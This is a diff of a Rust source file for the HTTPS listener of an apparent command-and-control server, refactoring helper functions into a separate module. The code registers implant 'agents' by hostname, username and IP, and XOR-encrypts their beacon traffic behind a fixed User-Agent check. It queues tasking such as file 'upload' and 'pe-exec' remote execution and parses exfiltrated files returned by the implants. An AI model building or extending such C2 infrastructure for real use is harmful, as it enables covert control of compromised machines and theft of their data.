@@ -1,7 +1,10 @@
 use crate::admin::Database;
-use crate::agents::agent_handler::{AgentHandler, AgentInfo};
+use crate::agents::agent_handler::AgentHandler;
 use crate::encryption::XORCipher;
-use crate::helper::helper_listener::{empty_response, json_error, text_response};
+use crate::helper::helper_listener::{
+    empty_response, extract_result_content, fetch_commands_with_data, json_error,
+    process_beacon_results, text_response, update_or_register_agent,
+};
 use crate::listener::profile::{ListenerProfile, ListenerProfileHttps};
 use axum::Server;
 use axum::{
@@ -19,15 +22,15 @@ use std::net::SocketAddr;
 use std::sync::Arc;
 
 // ============================================================================
-// STATE
+// STATE (public pour helper_listener)
 // ============================================================================
 
 #[derive(Clone)]
 pub struct ListenerState {
-    profile: ListenerProfile,
-    agent_handler: AgentHandler,
-    xor_cipher: Arc<XORCipher>,
-    database: Arc<Database>,
+    pub profile: ListenerProfile,
+    pub agent_handler: AgentHandler,
+    pub xor_cipher: Arc<XORCipher>,
+    pub database: Arc<Database>,
 }
 
 impl ListenerState {
@@ -45,7 +48,7 @@ impl ListenerState {
         }
     }
 
-    fn decrypt_body(&self, body: &Bytes) -> Result<String, ListenerError> {
+    pub fn decrypt_body(&self, body: &Bytes) -> Result<String, ListenerError> {
         let body_str = std::str::from_utf8(body)
             .map_err(|_| ListenerError::InvalidUtf8)?
             .trim();
@@ -59,13 +62,13 @@ impl ListenerState {
         String::from_utf8(decrypted).map_err(|_| ListenerError::InvalidUtf8)
     }
 
-    fn encrypt_response<T: Serialize>(&self, data: &T) -> String {
+    pub fn encrypt_response<T: Serialize>(&self, data: &T) -> String {
         let json = serde_json::to_string(data).unwrap_or_default();
         let encrypted = self.xor_cipher.encrypt(json.as_bytes());
         STANDARD.encode(&encrypted)
     }
 
-    fn validate_user_agent(&self, headers: &HeaderMap) -> Result<(), ListenerError> {
+    pub fn validate_user_agent(&self, headers: &HeaderMap) -> Result<(), ListenerError> {
         match headers.get("user-agent").and_then(|h| h.to_str().ok()) {
             Some(ua) if ua == self.profile.user_agent => Ok(()),
             _ => Err(ListenerError::InvalidUserAgent),
@@ -78,7 +81,7 @@ impl ListenerState {
 // ============================================================================
 
 #[derive(Debug)]
-enum ListenerError {
+pub enum ListenerError {
     InvalidUserAgent,
     InvalidUtf8,
     Base64Decode,
@@ -87,7 +90,7 @@ enum ListenerError {
 }
 
 impl ListenerError {
-    fn status_code(&self) -> StatusCode {
+    pub fn status_code(&self) -> StatusCode {
         match self {
             Self::InvalidUserAgent => StatusCode::FORBIDDEN,
             Self::InvalidUtf8 | Self::Base64Decode | Self::JsonParse => StatusCode::BAD_REQUEST,
@@ -95,7 +98,7 @@ impl ListenerError {
         }
     }
 
-    fn log_message(&self) -> &str {
+    pub fn log_message(&self) -> &str {
         match self {
             Self::InvalidUserAgent => "Invalid or missing User-Agent",
             Self::InvalidUtf8 => "Invalid UTF-8 in request",
@@ -114,17 +117,17 @@ impl IntoResponse for ListenerError {
 }
 
 // ============================================================================
-// DATA STRUCTURES
+// DATA STRUCTURES (public pour helper_listener)
 // ============================================================================
 
-#[derive(Debug, Deserialize, Serialize)]
-struct AgentBeacon {
-    agent_id: String,
-    hostname: String,
-    username: String,
-    process_name: String,
-    ip_address: String,
-    results: String,
+#[derive(Debug, Deserialize, Serialize, Clone)]
+pub struct AgentBeacon {
+    pub agent_id: String,
+    pub hostname: String,
+    pub username: String,
+    pub process_name: String,
+    pub ip_address: String,
+    pub results: String,
 }
 
 #[derive(Serialize)]
@@ -133,10 +136,10 @@ struct CheckinResponse {
     message: String,
 }
 
-#[derive(Serialize, Deserialize, Debug)]
-struct CommandItem {
-    id: i64,
-    command: String,
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct CommandItem {
+    pub id: i64,
+    pub command: String,
 }
 
 #[derive(Serialize)]
@@ -150,13 +153,13 @@ struct CommandRequest {
     agent_id: String,
 }
 
-#[derive(Deserialize)]
-struct ResultSubmit {
-    agent_id: String,
-    command_id: Option<i64>,
-    output: String,
-    success: bool,
-    r#types: String,
+#[derive(Deserialize, Clone)]
+pub struct ResultSubmit {
+    pub agent_id: String,
+    pub command_id: Option<i64>,
+    pub output: String,
+    pub success: bool,
+    pub r#types: String,
 }
 
 // ============================================================================
@@ -327,183 +330,8 @@ async fn handle_pe_data(
 }
 
 // ============================================================================
-// HELPER FUNCTIONS
+// PUBLIC API
 // ============================================================================
-
-fn update_or_register_agent(state: &ListenerState, beacon: &AgentBeacon) {
-    let timestamp = AgentHandler::get_current_timestamp();
-
-    if let Some(mut agent) = state.agent_handler.get_agent(&beacon.agent_id) {
-        agent.hostname = Some(beacon.hostname.clone());
-        agent.username = Some(beacon.username.clone());
-        agent.process_name = Some(beacon.process_name.clone());
-        agent.ip = Some(beacon.ip_address.clone());
-        agent.last_seen = timestamp;
-
-        state
-            .agent_handler
-            .update_agent(&beacon.agent_id, agent, Some(&state.database));
-    } else {
-        log::info!("[+] New agent detected: {}", beacon.agent_id);
-
-        let agent_info = AgentInfo {
-            agent_id: beacon.agent_id.clone(),
-            hostname: Some(beacon.hostname.clone()),
-            username: Some(beacon.username.clone()),
-            process_name: Some(beacon.process_name.clone()),
-            ip: Some(beacon.ip_address.clone()),
-            last_seen: timestamp,
-            payload_type: "exe".to_string(),
-            listener_name: state.profile.name.clone(),
-            file_path: None,
-        };
-
-        state.agent_handler.register_agent(
-            beacon.agent_id.clone(),
-            agent_info,
-            Some(&state.database),
-        );
-    }
-}
-
-fn process_beacon_results(state: &ListenerState, beacon: &AgentBeacon) {
-    log::info!("[+] Processing results from {}", beacon.agent_id);
-
-    state
-        .agent_handler
-        .push_result(&beacon.agent_id, beacon.results.clone());
-
-    let (output, result_type, filename) = parse_beacon_result(&beacon.results);
-
-    if let Err(e) =
-        state
-            .database
-            .store_result(&beacon.agent_id, None, &output, true, Some(result_type))
-    {
-        log::warn!("[!] Failed to store beacon result: {}", e);
-    } else {
-        log::info!(
-            "[+] Result stored | type={} | file={:?} | size={}",
-            result_type,
-            filename,
-            output.len()
-        );
-    }
-}
-
-fn parse_beacon_result(results: &str) -> (String, &'static str, Option<String>) {
-    if results.starts_with("File uploaded successfully")
-        || results.starts_with("Upload successful")
-        || results.starts_with("Error:")
-    {
-        return (results.to_string(), "text", None);
-    }
-
-    let decoded = match STANDARD.decode(results) {
-        Ok(bytes) => String::from_utf8(bytes).unwrap_or_else(|_| results.to_string()),
-        Err(_) => results.to_string(),
-    };
-
-    if decoded.starts_with("Error:") {
-        return (decoded, "text", None);
-    }
-
-    let normalized = decoded.replace('\'', "\"");
-    if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&normalized) {
-        if let Some(content) = parsed.get("content").and_then(|v| v.as_str()) {
-            let filename = parsed
-                .get("filename")
-                .and_then(|v| v.as_str())
-                .map(|s| s.to_string());
-
-            return (content.to_string(), "file_download", filename);
-        }
-    }
-
-    (decoded, "text", None)
-}
-
-fn extract_result_content(result: &ResultSubmit) -> (String, Option<String>) {
-    if result.r#types != "file" {
-        return (result.output.clone(), None);
-    }
-
-    let decoded = match STANDARD.decode(&result.output) {
-        Ok(bytes) => match String::from_utf8(bytes) {
-            Ok(s) => s,
-            Err(_) => return (result.output.clone(), None),
-        },
-        Err(_) => return (result.output.clone(), None),
-    };
-
-    if decoded.starts_with("Error:") || !result.success {
-        return (decoded, None);
-    }
-
-    let normalized = decoded.replace('\'', "\"");
-    match serde_json::from_str::<serde_json::Value>(&normalized) {
-        Ok(parsed) => {
-            let content = parsed
-                .get("content")
-                .and_then(|v| v.as_str())
-                .map(|s| s.to_string());
-            let filename = parsed
-                .get("filename")
-                .and_then(|v| v.as_str())
-                .map(|s| s.to_string());
-
-            match (content, filename.clone()) {
-                (Some(c), Some(f)) => {
-                    log::info!("[+] File parsed | name='{}' | size={}", f, c.len());
-                    (c, Some(f))
-                }
-                _ => (decoded, None),
-            }
-        }
-        Err(_) => (decoded, None),
-    }
-}
-
-fn fetch_commands_with_data(state: &ListenerState, agent_id: &str) -> Vec<CommandItem> {
-    let mut commands = Vec::new();
-
-    let pending = match state.database.get_pending_commands(agent_id) {
-        Ok(cmds) => cmds,
-        Err(e) => {
-            log::error!("[!] Failed to fetch commands: {}", e);
-            return commands;
-        }
-    };
-
-    for (cmd_id, cmd) in pending {
-        let command = if cmd.contains("'upload':") {
-            state
-                .database
-                .get_upload_data_for_command(cmd_id)
-                .ok()
-                .flatten()
-                .map(|data| format!("'upload':'{}'", data))
-                .unwrap_or(cmd)
-        } else if cmd.contains("'pe-exec':") {
-            state
-                .database
-                .get_pe_exec_data_by_command(cmd_id)
-                .ok()
-                .flatten()
-                .map(|data| format!("'pe-exec':'{}'", data))
-                .unwrap_or(cmd)
-        } else {
-            cmd
-        };
-
-        commands.push(CommandItem {
-            id: cmd_id,
-            command,
-        });
-    }
-
-    commands
-}
 
 fn build_router(state: Arc<ListenerState>) -> Router {
     let uri_path = state.profile.uri_paths.clone();
@@ -535,10 +363,6 @@ fn load_agents_from_db(
         }
     }
 }
-
-// ============================================================================
-// PUBLIC API
-// ============================================================================
 
 pub async fn start(profile: ListenerProfile, agent_handler: AgentHandler, database: Arc<Database>) {
     load_agents_from_db(&profile.name, &agent_handler, &database);
